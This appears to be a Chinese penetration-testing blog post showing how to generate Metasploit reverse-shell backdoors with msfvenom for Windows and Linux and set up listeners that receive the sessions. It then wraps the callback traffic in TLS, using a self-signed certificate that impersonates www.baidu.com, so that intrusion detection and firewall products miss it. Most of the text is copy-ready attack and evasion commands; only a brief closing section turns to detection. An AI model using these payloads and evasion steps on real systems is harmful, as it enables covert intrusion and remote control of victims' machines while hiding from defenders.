**写在前面**

 **本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

## 背景描述

在攻防对抗过程中的横行渗透，经常需要msf进行攻击操作，如果msf上线shell过程中流量是明文传输，那么内网环境中已有的安全检测产品（WAF/IPS/IDS/NDR/HIDS）等防护软件会进行流量检测，明文传输带有明显的攻击特征。很快会被检测发现，防守方对攻击流量回溯分析，就会阻断攻击行为。![1653218831_628a1e0fe24603c940b23.png!small](https://image.3001.net/images/20220522/1653218831_628a1e0fe24603c940b23.png!small)

## 明文流量

### windows环境

1.生成上线后门

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.86.2 LPORT=12377
-f exe > yun.exe

![1653219047_628a1ee7a9a9a979c8bd6.png!small?1653219045877](https://image.3001.net/images/20220522/1653219047_628a1ee7a9a9a979c8bd6.png!small?1653219045877)

2.设置msf监听

![1653219074_628a1f0260cab956a34e5.png!small?1653219072630](https://image.3001.net/images/20220522/1653219074_628a1f0260cab956a34e5.png!small?1653219072630)

3.成功上线shell

将生成的后门程序上传到目标服务器进行执行。

![1653219098_628a1f1a7e638b5359c74.png!small?1653219096788](https://image.3001.net/images/20220522/1653219098_628a1f1a7e638b5359c74.png!small?1653219096788)

后门上线

![1653219145_628a1f49afa10be612231.png!small?1653219143918](https://image.3001.net/images/20220522/1653219145_628a1f49afa10be612231.png!small?1653219143918)

4.分析流量

通过Wireshark抓包分析流量，整个通信过程全部为明文传输

通信过程由受害主机发起

![1653219172_628a1f6490ba1562c8331.png!small?1653219170754](https://image.3001.net/images/20220522/1653219172_628a1f6490ba1562c8331.png!small?1653219170754)

过滤tcp目的端口

tcp.dstport == 12377

追踪tcp数据流

![1653219198_628a1f7e8ff7bc9ab6a67.png!small?1653219197151](https://image.3001.net/images/20220522/1653219198_628a1f7e8ff7bc9ab6a67.png!small?1653219197151)

通过分析可以发现，该tcp连接由服务器端发起，传输数据为明文信息

![1653219225_628a1f9950782921a88b5.png!small?1653219224199](https://image.3001.net/images/20220522/1653219225_628a1f9950782921a88b5.png!small?1653219224199)

### Linux环境

1.生成上线后门

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.86.2 LPORT=12399
-f elf > yun.elf

![1653219262_628a1fbe0329c9680f4f1.png!small?1653219260158](https://image.3001.net/images/20220522/1653219262_628a1fbe0329c9680f4f1.png!small?1653219260158)

2.设置msf监听

msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp

payload => linux/x64/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set lhost 192.168.86.2

lhost => 192.168.86.2

msf5 exploit(multi/handler) > set lport 12399

lport => 12399

msf5 exploit(multi/handler) >

![1653219285_628a1fd5a8459e81e633a.png!small?1653219283834](https://image.3001.net/images/20220522/1653219285_628a1fd5a8459e81e633a.png!small?1653219283834)

3.成功上线shell

将生成的后门程序上传到目标服务器进行执行。

![1653219315_628a1ff3dcf57fce96812.png!small?1653219314107](https://image.3001.net/images/20220522/1653219315_628a1ff3dcf57fce96812.png!small?1653219314107)

获取meterpreter会话

![1653219343_628a200fdf0f145db4ba6.png!small?1653219342062](https://image.3001.net/images/20220522/1653219343_628a200fdf0f145db4ba6.png!small?1653219342062)

4.分析流量

通过Wireshark抓包分析流量，整个通信过程全部为明文传输

过滤tcp目的端口

tcp.dstport == 12399

追踪tcp数据流

![1653219487_628a209fd044a5e10faff.png!small?1653219486555](https://image.3001.net/images/20220522/1653219487_628a209fd044a5e10faff.png!small?1653219486555)

通过分析可以发现，该tcp连接由服务器端发起，传输数据为明文信息

![1653219511_628a20b77c0197e76dadf.png!small?1653219510458](https://image.3001.net/images/20220522/1653219511_628a20b77c0197e76dadf.png!small?1653219510458)

## 加密流量（windows）

通过使用OpenSSL流量加密

1.生成OpenSSL证书

openssl req -new -newkey rsa:4096 -days 365 -nodes -x509

-subj "/C=UK/ST=London/L=London/O=Development/CN=www.baidu.com"

-keyout www.baidu.com.key

-out www.baidu.com.crt &&

cat www.baidu.com.key www.baidu.com.crt > www.baidu.com.pem &&

rm -f www.baidu.com.key www.baidu.com.crt

![1653219537_628a20d1bd2db16c7c86a.png!small?1653219536023](https://image.3001.net/images/20220522/1653219537_628a20d1bd2db16c7c86a.png!small?1653219536023)

2.使用证书生成后门

win

msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.86.2 LPORT=4433
PayloadUUIDTracking=true HandlerSSLCert=www.baidu.com.pem
StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f exe -o zui.exe

![1653219562_628a20ea510cb5a2edd34.png!small?1653219560483](https://image.3001.net/images/20220522/1653219562_628a20ea510cb5a2edd34.png!small?1653219560483)

msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.86.2 LPORT=4433
PayloadUUIDTracking=true HandlerSSLCert=www.baidu.com.pem
StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f exe -o zui.bat

![1653219588_628a2104d6e7114aa9e2d.png!small?1653219587010](https://image.3001.net/images/20220522/1653219588_628a2104d6e7114aa9e2d.png!small?1653219587010)

3.设置msf监听

msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set payload
windows/x64/meterpreter/reverse_winhttps

payload => windows/x64/meterpreter/reverse_winhttps

msf5 exploit(multi/handler) > set lhost 192.168.86.2

lhost => 192.168.86.2

msf5 exploit(multi/handler) > set lport 4433

lport => 4433

msf5 exploit(multi/handler) > set handlersslcert www.baidu.com.pem

handlersslcert => www.baidu.com.pem

msf5 exploit(multi/handler) > set stagerverifysslcert true

![1653219613_628a211d5b32e95b5a552.png!small?1653219612359](https://image.3001.net/images/20220522/1653219613_628a211d5b32e95b5a552.png!small?1653219612359)

3.成功上线shell

注意：windows 7环境下通过OpenSSL流量加密无法上线成功！

以下是运行结果

![1653219640_628a21387e7491f1fa2cc.png!small?1653219638823](https://image.3001.net/images/20220522/1653219640_628a21387e7491f1fa2cc.png!small?1653219638823)

连接超时无法上线

![1653219660_628a214ccb55d7a18a216.png!small?1653219660010](https://image.3001.net/images/20220522/1653219660_628a214ccb55d7a18a216.png!small?1653219660010)

更换window10 环境，成功上线

执行程序，获取会话

![1653219684_628a2164ce5b9ec0f7a25.png!small?1653219683060](https://image.3001.net/images/20220522/1653219684_628a2164ce5b9ec0f7a25.png!small?1653219683060)

4.分析流量

通过Wireshark抓包分析流量，整个通信过程全部为加密流量传输

过滤tcp目的端口

tcp.dstport == 4433

追踪tcp数据流

![1653219706_628a217a0698a3015f58e.png!small?1653219704658](https://image.3001.net/images/20220522/1653219706_628a217a0698a3015f58e.png!small?1653219704658)

通过分析可以发现，该tcp连接由服务器端发起，传输数据为加密信息

![1653219732_628a21949a6ab2a258fac.png!small?1653219730861](https://image.3001.net/images/20220522/1653219732_628a21949a6ab2a258fac.png!small?1653219730861)

## 思考

安全的本质就是对抗！针对加密流量的检测，传统的基于特征的检测已经无法满足攻击发展的趋势，只有通过不断引入新的检测思考才能解决。

加密流量的检测，业界主流有2种方法：

第一种是将加密流量进行解密并进行检测，这需要安全检测设备充当通信双方的代理或者由客户提供单独的解密证书（只能针对该证书对应的加密流量进行解码）

第二种是在不解密的情况下进行安全检测，这通常会采用（AI）机器学习的方法。

当然对攻击行为的感知，也可以通过威胁狩猎发现。

